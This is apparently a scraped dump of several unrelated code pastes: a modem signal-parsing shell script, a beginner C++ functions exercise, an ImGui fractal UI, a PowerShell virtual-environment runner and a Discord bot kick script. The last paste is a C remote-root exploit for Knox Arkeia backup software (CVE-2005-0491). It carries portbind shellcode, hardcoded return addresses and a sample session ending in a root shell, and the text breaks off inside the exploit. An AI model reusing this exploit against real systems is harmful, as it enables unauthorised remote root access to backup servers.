		CHAN=$(echo $CCVAL | cut -d, -f7)
		CHAN=$(printf ""%d"" 0x$CHAN)
		PCID=$(echo $CCVAL | cut -d, -f8)
		PCID=$(printf ""%d"" 0x$PCID)
		BW=$(echo $CCVAL | cut -d, -f10)
		if [ ""$CRAT"" -eq 4 ]; then
			SSINR=$(echo $CCVAL | cut -d, -f11 | grep -o ""[-0-9]\{1,4\}"")
			if [ -n ""$SSINR"" ] && [ ""$SSINR"" != ""255"" ]; then
				SSINR=$(($SSINR / 2))"" dB""
			else
				SSINR=""-""
			fi
			if [ -n ""$SINR"" ]; then
				SINR=$SINR""<br />""$SSINR
			else
				SINR=$SSINR
			fi
			if [ $BW -gt 14 ]; then
				BW=$(($(echo $BW) / 5))
			else
				BW=""1.4""
			fi
			BAND=${BAND:1}
			if [ ""$CELLTYPE"" -eq 1 ]; then
				BAND=""B""$(echo $BAND | sed 's/^0*//')"" (Bandwidth: ""$BW"" MHz)""
			else
				BAND=""B""$(echo $BAND | sed 's/^0*//')"" (CA, Bandwidth: ""$BW"" MHz)""
			fi
		fi
		if [ ""$CRAT"" -eq 9 ]; then
			SSINR=$(echo $CCVAL | cut -d, -f11 | grep -o ""[0-9]\{1,3\}"")
			if [ -n ""$SSINR"" ] && [ ""$SSINR"" != ""255"" ]; then
				SSINR=$((($SSINR - 47) / 2))"" dB""
			else
				SSINR=""-""
			fi
			if [ -n ""$SINR"" ]; then
				SINR=$SINR""<br />""$SSINR
			else
				SINR=$SSINR
			fi
			if [ ""$CELLTYPE"" -eq 1 ]; then
				BAND=""n""${BAND:2}"" (Bandwidth: ""$BW"" MHz)""
			else
				BAND=""n""${BAND:2}"" (CA, Bandwidth: ""$BW"" MHz)""
			fi
		fi
		if [ -n ""$LBAND"" ]; then
			LBAND=$LBAND""<br />""$BAND
		else
			LBAND=$BAND
		fi
		if [ -n ""$CHANNEL"" ]; then
			CHANNEL=$CHANNEL"",""$CHAN
		else
			CHANNEL=$CHAN
		fi
		if [ -n ""$PCI"" ]; then
			PCI=$PCI"",""$PCID
		else
			PCI=$PCID
		fi
		if [ ""$CELLTYPE"" -eq 1 ]; then
			RSRP=$(echo $CCVAL | cut -d, -f13)
			RSRQ=$(echo $CCVAL | cut -d, -f14)
			if [ ""$RSRP"" -ne 255 ] && [ ""$RSRQ"" -ne 255 ]; then
				decode_signal
				RSSI=$(rsrp2rssi $RSCPs $BW)
				CSQ_PER=$((100 - (($RSSI + 51) * 100/-62)))""%""
				CSQ=$((($RSSI + 113) / 2))
				CSQ_RSSI=$RSSI"" dBm""
			fi
		fi
	done
fi

if [ -n ""$GTCCDATAy"" ]; then
	CHANNEL=$(echo $GTCCDATAy | cut -d, -f7)
	BW=$(echo $GTCCDATAy | cut -d, -f10)
	decode_bw
	LBAND=""B""$(echo $GTCCDATAy | cut -d, -f9)"" (Bandwidth: ""$BW"" MHz)""
	XUDATA=""""
fi

if [ -n ""$XLDATA"" ]; then
	XLDATA=$(echo ""${XLDATA//[\"" ]/}"")
	XLEC=$(echo $OX | grep -o ""+XLEC: [01],[0-9]\+,[0-5],.*BAND_LTE_[0-9]\{1,2\},[^ ]\+"")
	ATRSRP=$(echo $OX | grep -o ""+RSRP:[^O]\+"")
	ATRSRP=$(echo ""$ATRSRP"" | grep -o ""[0-9]\{1,3\},[0-9]\{1,5\},-[0-9]\{2,3\}"")
	MODE=""LTE""
	PCI=$(echo $XLDATA | cut -d, -f6)
	PCI=$(printf ""%d"" $PCI)
	CHANNEL=$(echo $XLDATA | cut -d, -f7)
	CHANNEL=$(printf ""%d"" $CHANNEL)
	LBAND=$($ROOTER/chan2band.sh ""$CHANNEL"")
	if [ -n ""$XLEC"" ]; then
		BW=$(echo $XLEC | cut -d, -f3)
		RAWLIST=$(echo $XLEC | grep -o ""BAND_LTE_[0-9]\{1,2\}.\+"" | grep -o ""[,0-9]*"" | tr ',' ' ')
		BANDLIST=""""
		NUMBR=0
		for BAND in $(echo ""$RAWLIST""); do
			if [ -n ""$BAND"" -a ""$BAND"" != ""0"" ]; then
				NUMBR=$(($(echo $NUMBR) + 1))
				if [ -n ""$BANDLIST"" ]; then
					BANDLIST=""$BANDLIST,$BAND""
				else
					BANDLIST=""$BAND""
				fi
			fi
		done
		BAND=""B""$(echo $BANDLIST | cut -d, -f1)
		if [ ""$BAND"" = ""$LBAND"" ]; then
			decode_bw
			LBAND=$LBAND"" (Bandwidth $BW MHz)""
			for JJ in $(seq 2 $NUMBR); do
				BAND=$(echo $BANDLIST | cut -d, -f$JJ)
				if [ -n ""$BAND"" -a ""$BAND"" != ""0"" ]; then
					KK=$(($JJ + 2))
					BW=$(echo $XLEC | cut -d, -f$KK)
					decode_bw
					if [ $BW != ""-"" ]; then
						LBAND=$LBAND""<br />B$BAND (CA, Bandwidth $BW MHz)""
					fi
				fi
			done
			NBRrsrp=1
			for JJ in $(echo ""$ATRSRP""); do
				if [ $NBRrsrp -gt 1 -a $NBRrsrp -le $NUMBR ]; then
					PCICA=$PCICA"" ""$(echo $JJ | cut -d, -f1)
					CHANCA=$CHANCA"" ""$(echo $JJ | cut -d, -f2)
					RSRPCA=$RSRPCA"" ""$(echo $JJ | cut -d, -f3)

				fi
				NBRrsrp=$((NBRrsrp + 1))
			done
		fi
	else
		XLEC=$(echo $OX | grep -o ""+XLEC: 0,[1-9],[0-5]"")
		if [ -n ""$XLEC"" ]; then
			BW=$(echo $XLEC | cut -d, -f3)
			decode_bw
			LBAND=$LBAND"" (Bandwidth $BW MHz)""
		fi
	fi
	RSRP=$(echo $XLDATA | cut -d, -f10)
	if [ $RSRP == 0 ]; then
		RSRP=1
	fi
	RSCP=$(($RSRP - 141))
	ECIO=$(echo $XLDATA | cut -d, -f11)
	ECIO=$((($ECIO / 2) - 20))
	SINR=$(echo $XLDATA | cut -d, -f12 | grep -o ""[-0-9]\{1,4\}"")
	if [ -n ""$SINR"" ] && [ ""$SINR"" != ""255"" ]; then
		SINR=$(($SINR / 2))"" dB""
	fi
	if [ -n ""$BW"" ]; then
		RSSI=$(rsrp2rssi $RSCP $BW)
		CSQ_PER=$((100 - (($RSSI + 51) * 100/-62)))""%""
		CSQ=$((($RSSI + 113) / 2))
		CSQ_RSSI=$RSSI"" dBm""
	fi
fi
if [ -n ""$XUDATA"" ]; then
	MODE=""UMTS""
	CHANNEL=$(echo $XUDATA | cut -d, -f7)
	CHANNEL=${CHANNEL:1:10}
	CHANNEL=$(printf ""%d"" $CHANNEL)
	RSCP=$(echo $XUDATA | cut -d, -f11)
	RSCP=$(($RSCP - 121))
	ECIO=$(echo $XUDATA | cut -d, -f12)
	ECIO=$((($ECIO / 2) - 24))
fi
if [ -n ""$CADATA1"" ]; then
	RSCP=""""
	ECIO=""""
	BW=$(echo $CADATA1 | cut -d, -f13)
	decode_bw
	BWD=$BW
	BW=$(echo $CADATA1 | cut -d, -f14)
	decode_bw
	BWU=$BW
	LBAND=""B""$(echo $CADATA1 | cut -d, -f2)"" (Bandwidth $BWD MHz Down | $BWU MHz Up)""
	CHANNEL=$(echo $CADATA1 | cut -d, -f11)
	MODE=""LTE""
	CRAT=""4""
	RSRP=$(echo $CADATA1 | cut -d, -f8)
	RSRQ=$(echo $CADATA1 | cut -d, -f9)
	if [ ""$RSRP"" -ne 255 ] && [ ""$RSRQ"" -ne 255 ]; then
		decode_signal
		RSSI=$(rsrp2rssi $RSCPs $BWD)
		CSQ_PER=$((100 - (($RSSI + 51) * 100/-62)))""%""
		CSQ=$((($RSSI + 113) / 2))
		CSQ_RSSI=$RSSI"" dBm""
	else
		RSRP=""-""
		RSRQ=""-""
	fi
	PCI=$(echo $CADATA1 | cut -d, -f7)
fi
if [ -n ""$CADATA2"" ]; then
	CADATA2=$(echo ""${CADATA2//[ ]/}"")
	for CAVAL in $(echo ""$CADATA2""); do
		BW=$(echo $CAVAL | cut -d, -f9)
		decode_bw
		BWD=$BW
		BW=$(echo $CAVAL | cut -d, -f10)
		decode_bw
		BWU=$BW
		LBAND=$LBAND""<br />B""$(echo $CAVAL | cut -d, -f2)
		if [ $BWU = ""-"" ]; then
			LBAND=$LBAND"" (CA, Bandwidth: ""$BWD"" MHz)""
		else
			LBAND=$LBAND"" (CA, Bandwidth $BWD MHz Down | $BWU MHz Up)""
		fi
		CHAN=$(echo $CAVAL | cut -d, -f7)
		CHANNEL=$(echo ""$CHANNEL"", ""$CHAN"")
		PCIX=$(echo $CAVAL | cut -d, -f3)
		PCI=$(echo ""$PCI"", ""$PCIX"")
	done
fi
if [ -n ""$CADATA3"" ]; then
	CADATA3=$(echo ""${CADATA3//[ ]/}"")
	for CAVAL in $(echo ""$CADATA3""); do
		BAND=$(echo $CAVAL | cut -d, -f3)
		BAND=${BAND:1}
		PCIX=$(echo $CAVAL | cut -d, -f4)
		PCI=$(echo ""$PCI"",""$PCIX"")
		CHAN=$(echo $CAVAL | cut -d, -f5)
		CHANNEL=$(echo ""$CHANNEL"",""$CHAN"")
		BW=$(echo $CAVAL | cut -d, -f6)
		if [ $BW -gt 14 ]; then
			BW=$((BW / 5))
		else
			BW=""1.4""
		fi
		LBAND=$LBAND""<br />B""$(echo $BAND | sed 's/^0*//')"" (CA, Bandwidth: ""$BW"" MHz)""
	done
fi
if [ -n ""$CADATA4"" ]; then
	NRCA=$(echo $CADATA4 | grep -o ""PCC,[15]"")
	CADATA4=$(echo $CADATA4 | grep -o ""SCC[0-9][^S]\+"")
	if [ -n ""NRCA"" ]; then
		CALIST4=$(echo $CADATA4 | grep -o ""SCC[0-9]\{1,2\},2,[01],[0-9]\{4,5\},[0-9]\{1,3\},[0-9]\{6\},[0-9]\{1,3\},[0-9]\{1,3\},[^S]\+"")
		for CAVAL in $(echo ""$CALIST4""); do
			BAND=$(echo $CAVAL | cut -d, -f4)
			RATP=${BAND:0:1}
			if [ ""$RATP"" == ""1"" ]; then
				RATP=""B""
			else
				RATP=""n""
			fi
			UPL=$(echo $CAVAL | cut -d, -f3)
			BWD=$(echo $CAVAL | cut -d, -f7)
			BWU=$(echo $CAVAL | cut -d, -f8)
			SHOWBWU=true
			if [ $RATP == ""B"" ]; then
				if [ $BWD -gt 14 ]; then
					BWD=$((BWD / 5))
				else
					BWD=""1.4""
				fi
				if [ $BWU -gt 14 ]; then
					BWU=$((BWD / 5))
				else
					BWU=""1.4""
					SHOWBWU=false
				fi
			else
				if [ ""$BWU"" == ""0"" ]; then
					BWU=""5""
				fi
				if [ ""$BWD"" == ""0"" ]; then
					BWD=""5""
					SHOWBWU=false
				fi
			fi
			CHANNEL=$(echo ""$CHANNEL"",""$(echo $CAVAL | cut -d, -f6)"")
			PCI=$(echo ""$PCI"",""$(echo $CAVAL | cut -d, -f5)"")
			BAND=${BAND:1}
			if [ $UPL == ""1"" ]; then
				LBAND=$LBAND""<br />$RATP""$(echo $BAND | sed 's/^0*//')"" (CA""$(printf ""\xe2\x86\x91"")"", Bandwidth: ""$BWD"" MHz down | ""$BWU"" MHz up)""
			elif $SHOWBWU; then
				LBAND=$LBAND""<br />$RATP""$(echo $BAND | sed 's/^0*//')"" (CA, Bandwidth: ""$BWD"" MHz down | ""$BWU"" MHz up)""
			else
				LBAND=$LBAND""<br />$RATP""$(echo $BAND | sed 's/^0*//')"" (CA, Bandwidth: ""$BWD"" MHz)""
			fi
		done
	fi
fi
if [ -z ""$CADATA2"" ] && [ -z ""$CADATA3"" ] && [ -z ""$CADATA4"" ]; then
	RSRPCA=$(echo $RSRPCA | tr "" "" "","")
	if [ -n ""$RSRPCA"" ]; then
		RSCP=$RSCP"",""$RSRPCA
	fi
	PCICA=$(echo $PCICA | tr "" "" "","")
	if [ -n ""$PCICA"" ]; then
		PCI=$PCI"",""$PCICA
	fi
	CHANCA=$(echo $CHANCA | tr "" "" "","")
	if [ -n ""$CHANCA"" ]; then
		CHANNEL=$CHANNEL"",""$CHANCA
	fi
fi
MTEMP=$(echo $OX | grep -o ""+MTSM: [0-9.]\{1,5\}"")
if [ -n ""$MTEMP"" ]; then
	CTEMP=$(echo $MTEMP | grep -o ""[0-9.]\{1,5\}"")$(printf ""\xc2\xb0"")""C""
fi

MODTYPE=""9""
MRAT=$(echo $OX | grep -o ""+GTRAT: [0-9]\{1,2\}"" | grep -o ""[0-9]\{1,2\}"")
if [ -n ""$MRAT"" ]; then
# If user inserted different SIM card, the Rat order will recover to default value (AT Commands manual)
	case $MRAT in
	""2"" )
		NETMODE=""5"" ;;
	""3"" )
		NETMODE=""7"" ;;
	""14"" )
		NETMODE=""9"" ;;
	""17""|""20"" )
		NETMODE=""8"" ;;
	* )
		NETMODE=""1"" ;;
	esac
fi
XACT=$(echo $OX | grep -o ""+XACT: [0-9]"" | grep -o ""[0-9]"")
if [ -n ""$XACT"" ]; then
	PREF=$(echo $OX | grep -o ""+XACT: [0-9],[0-9]"" | grep -o "",[0-9]"")
	case $XACT in
	""1"" )
		NETMODE=""5"" ;;
	""2"" )
		NETMODE=""7"" ;;
	""4"" )
		if [ ""$PREF"" = "",1"" ]; then
			NETMODE=""4""
		else
			NETMODE=""6""
		fi ;;
	* )
		NETMODE=""6"" ;;
	esac
fi
CMODE=$(uci -q get modem.modem$CURRMODEM.cmode)
if [ ""$CMODE"" = 0 ]; then
	NETMODE=""10""
fi
if [ -z ""$SINR"" ]; then
	SINR=""-""
fi

{
	echo 'CSQ=""'""$CSQ""'""'
	echo 'CSQ_PER=""'""$CSQ_PER""'""'
	echo 'CSQ_RSSI=""'""$CSQ_RSSI""'""'
	echo 'ECIO=""'""$ECIO""'""'
	echo 'RSCP=""'""$RSCP""'""'
	echo 'ECIO1=""'""$ECIO1""'""'
	echo 'RSCP1=""'""$RSCP1""'""'
	echo 'MODE=""'""$MODE""'""'
	echo 'MODTYPE=""'""$MODTYPE""'""'
	echo 'NETMODE=""'""$NETMODE""'""'
	echo 'CHANNEL=""'""$CHANNEL""'""'
	echo 'LBAND=""'""$LBAND""'""'
	echo 'PCI=""'""$PCI""'""'
	echo 'TEMP=""'""$CTEMP""'""'
	echo 'SINR=""'""$SINR""'""'
}  > /tmp/signal$CURRMODEM.file
if [ -n ""$COPS_MCC"" ]; then
	echo 'COPS_MCC=""'""$COPS_MCC""'""' >> /tmp/signal$CURRMODEM.file
	echo 'COPS_MNC=""'""$COPS_MNC""'""' >> /tmp/signal$CURRMODEM.file
fi
if [ -n ""$COPX"" ]; then
	echo 'COPS=""'""$COPX""'""' >> /tmp/signal$CURRMODEM.file
fi
"
b0dKhTgk,Untitled,35657,C++,Friday 1st of March 2024 10:57:38 PM CDT,"#include <iostream>
#include <time.h>   // для time()
#include <stdlib.h> // для rand()

using namespace std;

void Hello() { // функция не принимает параметров и не возвращает значение
	cout << ""Hello World!"" << endl;
	cout << ""Hello World!"" << endl;
}

void Star(int count) { // функция принимает один параметр и не возвращает значение
	for (int i = 0; i < count; i++) {
		cout << '*';
	}
	cout << endl;
}

void Line(char symb, int count) { // функция принимает два параметра и не возвращает значение
	for (int i = 0; i < count; i++) {
		cout << symb;
	}
	cout << endl;
}

int Pow(int digit, int pow) { // принимает два параметра и возвращает значение
	int temp = 1;
	for (int i = 0; i < pow; i++) {
		temp *= digit;
	}
	return temp;
}

int Min(int a, int b) {
	return a < b ? a : b;
}

void Init(int arr[], const int size) {
	for (int i = 0; i < size; i++) {
		arr[i] = rand() % 100;
	}
}

void Print(int arr[], const int size) {
	for (int i = 0; i < size; i++) {
		cout << arr[i] << "" "";
	}
	cout << endl;
}

int main() {

	setlocale(LC_ALL, ""ru"");

	const int size = 5;

	int arr[size];

	Init(arr, size);

	Print(arr, size);

	arr[0] = 33;

	Hello();

	Star(20);
	
	Line('#', 30);

	cout << 2 + Pow(2, 4) << endl;

	int a = 15, b = 10;

	cout << Min(a, b) << endl;
}"
54nJ2pGg,Verbose ImGui,Frumkin,C++,Friday 1st of March 2024 10:45:02 PM CDT,"void UIManager::render(sf::RenderWindow& window, const sf::Vector2f complex, const sf::Sprite& sprite) {
    inputs_changed = false;

    if (ImGui::Begin(""Settings"")) {
        is_focused = ImGui::IsWindowFocused();

        bool fractal_configurations_inputs_changed = false;
        if (ImGui::CollapsingHeader(""Fractal Configurations"", ImGuiTreeNodeFlags_DefaultOpen)) {
            ImGui::Text(""Iterations"");
            ImGui::SameLine();
            int signed_iterations = static_cast<int>(settings.iterations);
            const bool iterations_changed = ImGui::SliderInt(""##iterations"", &signed_iterations, FractalSettings::MINIMUM_ITERATIONS, FractalSettings::MAXIMUM_ITERATIONS);
            if (iterations_changed) settings.iterations = static_cast<unsigned int>(signed_iterations);

            bool current_set_changed = false;
            if (ImGui::BeginCombo(""##set_type"", stringify(settings.current_set).c_str())) {
                SetType previous = settings.current_set;
                for (std::size_t index = 0; index < static_cast<std::size_t>(SetType::COUNT); index += 1) {
                    SetType type = static_cast<SetType>(index);
                    const bool is_selected = type == settings.current_set;
                    if (ImGui::Selectable(stringify(type).c_str(), is_selected)) {
                        settings.current_set = type;
                    }

                    if (is_selected) ImGui::SetItemDefaultFocus();
                }

                ImGui::EndCombo();
                current_set_changed = previous != settings.current_set;
            }

            bool input_changed_based_on_julia = false;
            if (settings.current_set == SetType::JULIA) {
                ImGui::Text(""Use Phoenix Complex"");
                ImGui::SameLine();
                const bool use_phoenix_complex_changed = ImGui::Checkbox(""##use_phoenix_complex"", &settings.use_phoenix_complex);

                ImGui::Text(""Julia Complex"");
                ImGui::SameLine();
                float julia_complex_floats[2] = { settings.julia_complex.x, settings.julia_complex.y }; 
                const bool julia_complex_changed = ImGui::SliderFloat2(""##julia_complex"", julia_complex_floats, FractalSettings::JULIA_COMPLEX_MINIMUM, FractalSettings::JULIA_COMPLEX_MAXIMUM);
                if (julia_complex_changed) settings.julia_complex = sf::Vector2f(julia_complex_floats[0], julia_complex_floats[1]);

                bool phoenix_complex_changed = false;
                if (settings.use_phoenix_complex) {
                    ImGui::Text(""Phoenix Complex"");
                    ImGui::SameLine();
                    float phoenix_complex_floats[2] = { settings.phoenix_complex.x, settings.phoenix_complex.y }; 
                    phoenix_complex_changed = ImGui::SliderFloat2(""##phoenix_complex"", phoenix_complex_floats, FractalSettings::PHOENIX_COMPLEX_MINIMUM, FractalSettings::PHOENIX_COMPLEX_MAXIMUM);
                    if (phoenix_complex_changed) settings.phoenix_complex = sf::Vector2f(phoenix_complex_floats[0], phoenix_complex_floats[1]);
                }

                if (use_phoenix_complex_changed || julia_complex_changed || phoenix_complex_changed) input_changed_based_on_julia = true;
            }

            if (iterations_changed || current_set_changed || input_changed_based_on_julia) fractal_configurations_inputs_changed = true;
        }

        bool main_coloring_changed = false;
        if (ImGui::CollapsingHeader(""Coloring"")) {
            bool coloring_changed = false;
            if (ImGui::BeginCombo(""##coloring_type"", stringify(settings.coloring).c_str())) {
                ColoringType previous = settings.coloring;
                for (std::size_t index = 0; index < static_cast<std::size_t>(ColoringType::COUNT); index += 1) {
                    ColoringType type = static_cast<ColoringType>(index);
                    const bool is_selected = type == settings.coloring;
                    if (ImGui::Selectable(stringify(type).c_str(), is_selected)) {
                        settings.coloring = type;
                    }

                    if (is_selected) ImGui::SetItemDefaultFocus();
                }

                ImGui::EndCombo();
                coloring_changed = previous != settings.coloring;
            }

            ImGui::Text(""Color Repeatings"");
            ImGui::SameLine();
            int signed_color_repeatings = static_cast<int>(settings.color_repeatings);
            const bool color_repeatings_changed = ImGui::SliderInt(""##color_repeatings"", &signed_color_repeatings, FractalSettings::MINIMUM_COLOR_REPEATINGS, FractalSettings::MAXIMUM_COLOR_REPEATINGS);
            if (color_repeatings_changed) settings.color_repeatings = static_cast<unsigned int>(signed_color_repeatings);

            bool inputs_changed_based_on_coloring = false;
            switch (settings.coloring) {
                case ColoringType::MIX: {
                    ImGui::Text(""First Color"");
                    ImGui::SameLine();
                    float first_color_floats[3] = { settings.first_color.r / 255.0f, settings.first_color.g / 255.0f, settings.first_color.b / 255.0f };
                    const bool first_color_changed = ImGui::ColorEdit3(""##first_color"", first_color_floats, ImGuiColorEditFlags_NoSidePreview | ImGuiColorEditFlags_PickerHueWheel);
                    if (first_color_changed) settings.first_color = sf::Color(static_cast<sf::Uint8>(first_color_floats[0] * 255), static_cast<sf::Uint8>(first_color_floats[1] * 255), static_cast<sf::Uint8>(first_color_floats[2] * 255));

                    ImGui::Text(""Second Color"");
                    ImGui::SameLine();
                    float second_color_floats[3] = { settings.second_color.r / 255.0f, settings.second_color.g / 255.0f, settings.second_color.b / 255.0f };
                    const bool second_color_changed = ImGui::ColorEdit3(""##second_color"", second_color_floats, ImGuiColorEditFlags_NoSidePreview | ImGuiColorEditFlags_PickerHueWheel);
                    if (second_color_changed) settings.second_color = sf::Color(static_cast<sf::Uint8>(second_color_floats[0] * 255), static_cast<sf::Uint8>(second_color_floats[1] * 255), static_cast<sf::Uint8>(second_color_floats[2] * 255));

                    if (first_color_changed || second_color_changed) inputs_changed_based_on_coloring = true;
                    break;
                }
                case ColoringType::RAINBOW: {
                    ImGui::Text(""Saturation"");
                    ImGui::SameLine();
                    const bool saturation_changed = ImGui::SliderFloat(""##saturation"", &settings.rainbow_saturation, 0.0f, 1.0f);

                    ImGui::Text(""Brightness"");
                    ImGui::SameLine();
                    const bool brightness_changed = ImGui::SliderFloat(""##brightness"", &settings.rainbow_brightness, 0.0f, 1.0f);

                    if (saturation_changed || brightness_changed) inputs_changed_based_on_coloring = true;
                    break;
                }
            }

            if (coloring_changed || color_repeatings_changed || inputs_changed_based_on_coloring) main_coloring_changed = true;
        }

        bool viewing_changed = false;
        if (ImGui::CollapsingHeader(""View"")) {
            ImGui::Text(""Center: %g + %gi"", complex.x, complex.y);

            ImGui::Text(""Zoom Speed"");
            ImGui::SameLine();
            const bool zoom_speed_changed = ImGui::SliderFloat(""##zoom_speed"", &settings.zoom_speed, FractalSettings::MINIMUM_ZOOM_SPEED, FractalSettings::MAXIMUM_ZOOM_SPEED);

            ImGui::Text(""Pan Speed"");
            ImGui::SameLine();            
            const bool pan_speed_changed = ImGui::SliderFloat(""##pan_speed"", &settings.pan_speed, FractalSettings::MINIMUM_PAN_SPEED, FractalSettings::MAXIMUM_PAN_SPEED);

            if (ImGui::Button(""Save Image"")) sprite.getTexture()->copyToImage().saveToFile(image_file_name);
            ImGui::SameLine();

            std::array<char, 256> raw_image_file_name;
            std::strcpy(raw_image_file_name.data(), image_file_name.c_str());
            const bool image_file_name_changed = ImGui::InputText(""##image_file_name"", raw_image_file_name.data(), raw_image_file_name.size());
            if (image_file_name_changed) image_file_name = raw_image_file_name.data();

            if (zoom_speed_changed || pan_speed_changed) viewing_changed = true;
        }

        if (fractal_configurations_inputs_changed || viewing_changed || main_coloring_changed) inputs_changed = true;
    }

    ImGui::End();
    ImGui::SFML::Render(window);
}"
1d0WPn4n,run.ps1,alaestor,PowerShell,Friday 1st of March 2024 10:31:11 PM CDT,"### Activates virtual environment, installs requirements, and runs a program

# Creates and activates the virtual environment folder. Throws on error
function InitializeVirtualEnvironment($virtual_environment_path) {
	# Ensure we have python
	if ((Get-Command ""python"" -ErrorAction SilentlyContinue) -eq $null) {
		throw ""Python was not found""
	}

	#  Create virtual environment if it doesn't already exist
	if (-not (Test-Path $virtual_environment_path)) {
		python -m venv $virtual_environment_path
		if ($LastExitCode -ne 0) {
			throw ""Failed to create virtual environment: $virtual_environment_path""
		}
	}

	# Ensure virtual environment and activate script exist
	if (-not (Test-Path ""$virtual_environment_path\Scripts\Activate.ps1"")) {
		throw ""Virtual environment or activate script not found: $virtual_environment_path""
	}

	# Activate virtual environment
	& ""$virtual_environment_path\Scripts\Activate.ps1""

	# Test to see if Python is running in a virtual environment
	python -c 'import sys;sys.exit(0 if sys.prefix != sys.base_prefix else -1)'
	if ($LastExitCode -ne 0) {
		throw ""Python appears to not be running in a virtual environment""
	}
}

# Returns true if successful, false if there's no file. Throws on error
function InstallRequirements($requirements_file_path) {
	if (Test-Path $requirements_file_path) {
		pip install -r $requirements_file_path --quiet --disable-pip-version-check
		if ($LastExitCode -ne 0) {
			throw ""Pip failed to install the requirements from $requirements_file_path""
		}
		return $true
	}
	return $false
}

try
{
	$original_cwd = (Get-Item .).FullName
	$cwd = ""$original_cwd/src/""
	$vp = ""$original_cwd/.venv/""
	$rf = ""$cwd/requirements.txt""
	$entrypoint = ""$cwd/main.py""

	if (-not (Test-Path $entrypoint)) {
		throw ""Entrypoint file not found""
	}

	# Enter the working directory
	Set-Location -LiteralPath $cwd

	# Create and Activate the virtual environment
	InitializeVirtualEnvironment($vp)

	# Install requirements if they exist
	$r = InstallRequirements($rf)

	# Execute the target python script
	python $entrypoint
}
catch
{
	Write-Error -Message $_
}
finally
{
	# Return to the original working directory
	Set-Location -LiteralPath $original_cwd

	# Exit virtual environment if the command to do so is available
	if ((Get-Command ""deactivate"" -ErrorAction SilentlyContinue) -ne $null) {
		deactivate
	}
}
"
xM0a0My7,BDFD - Kick user if they doesn't has avatar,StaffVanish,Go,Friday 1st of March 2024 10:18:22 PM CDT,"Trigger: $onJoined[channelID]
Script Language: BDScript 2
Code:
$nomention
$var[reason;Suspicius account] $c[<= Kick reason (optional)]


$c[Code to check user avatar]

$c[1. Check if user didn't has avatar]
$if[$checkContains[$authorAvatar;https://cdn.discordapp.com/embed/avatars/]]

$c[5. Kick them]
$kick[$authorID;$cropText[$var[reason];500;]]

$c[Add another code above here, if you want a kick dm message or log]

$c[Example:]

$if[$isUserDMEnabled[$authorID]==true]
$channelSendMessage[$dmChanelID[$authorID;Hi <@$authorID>, You're suspicius because you doesn't have a avatar. You must have a avatar, before join this server again]
$endif

$endif"
uShNpS55,Mad,Unknown_No_1,PHP,Friday 1st of March 2024 09:57:07 PM CDT,WExLOVExYOUxMAD
2L7phmns,Knox Arkeia Pro 5.1.12 - Backup Remote Code Execution - CVE-2005-0491,FlyFar,C,Friday 1st of March 2024 08:43:04 PM CDT,"/*
 * Knox Arkiea arkiead local/remote root exploit.
 *
 * Portbind 5074 shellcode
 *
 * Tested on Redhat 8.0, Redhat 7.2, but all versions are presumed vulnerable.
 * 
 * NULLs out least significant byte of EBP to pull EIP out of overflow buffer.
 * A previous request forces a large allocation of NOP's + shellcode in heap
 * memory.  Find additional targets by searching the heap for NOP's after a 
 * crash.  safeaddr must point to any area of memory that is read/writable
 * and won't mess with program/shellcode flow. 
 *
 * ./ark_sink host targetnum 
 * [user@host dir]$ ./ark_sink 192.168.1.2 1
 * [*] Connected to 192.168.1.2:617
 * [*] Connected to 192.168.1.2:617
 * [*] Sending nops+shellcode
 * [*] Done, sleeping
 * [*] Sending overflow
 * [*] Done
 * [*] Sleeping and connecting remote shell
 * [*] Connected to 192.168.1.2:5074
 * [*] Success, enjoy
 * id
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 *
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/errno.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/nameser.h>


#define BUFLEN		10000		/* for getshell()  		*/
#define LEN 		280		/* overflow packet data section    */
#define HEAD_LEN 	8		               /*  overflow packet header	*/
#define NOP_LEN		10000		/* nop+shellcode packet 	*/
#define ARK_PORT	617
#define SHELL_PORT	5074
#define NOP 		0x90
#define NUMTARGS	2

struct {
	char 		*os;
	unsigned int	targret;
	unsigned int	targsafe;
} targets[] = {
	{ ""Redhat 8.0"", 0x80ecf90, 0x080eb940 },
	{ ""Redhat 7.2"", 0x80eddc0, 0x080eb940 },
	NULL
};


/* portbind 5074 */
const char shellcode[] = 
""\x89\xc3\xb0\x02\xcd\x80\x38\xc3\x74\x05\x8d\x43\x01\xcd\x80""
""\x31\xc0\x89\x45\x10\x40\x89\xc3\x89\x45\x0c\x40\x89\x45\x08""
""\x8d\x4d\x08\xb0\x66\xcd\x80\x89\x45\x08\x43\x66\x89\x5d\x14""
""\x66\xc7\x45\x16\x13\xd2\x31\xd2\x89\x55\x18\x8d\x55\x14""
""\x89\x55\x0c\xc6\x45\x10\x10\xb0\x66\xcd\x80\x40\x89\x45\x0c""
""\x43\x43\xb0\x66\xcd\x80\x43\x89\x45\x0c\x89\x45\x10\xb0\x66""
""\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x03""
""\x75\xf6\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69""
""\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"";

unsigned int resolve(char *hostname)
{
	u_long 	ip = 0;
	struct hostent	*hoste;

	if ((int)(ip = inet_addr(hostname)) == -1)
	{
		if ((hoste = gethostbyname(hostname)) == NULL)
		{
			herror(""[!] gethostbyname"");
			exit(-1);
		}
		memcpy(&ip, hoste->h_addr, hoste->h_length);
	}
	return(ip);
}


int isock(char *hostname, int portnum)
{
	struct sockaddr_in	sock_a;
	int			num, sock;
	unsigned int		ip;
	fd_set			input;

	sock_a.sin_family = AF_INET;
	sock_a.sin_port = htons(portnum);
	sock_a.sin_addr.s_addr = resolve(hostname);

	if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
	{
		herror(""[!] accept"");
		exit(-1);
	}
	
	if (connect(sock, (struct sockaddr *)&sock_a, sizeof(sock_a)))
	{
		herror(""[!] connect"");
		exit(-1);
	}
	
	fprintf(stderr, ""[*] Connected to %s:%d\n"", hostname, portnum);
	return(sock);
	
}

int getshell(int sock)
{

	char	buf[BUFLEN];
	int	nread=0;

  	while(1) 
	{ 
    		fd_set input; 
    		FD_SET(0,&input); 
    		FD_SET(sock,&input); 
    		select(sock+1,&input,NULL,NULL,NULL); 
    	
		if(FD_ISSET(sock,&input)) 
		{ 
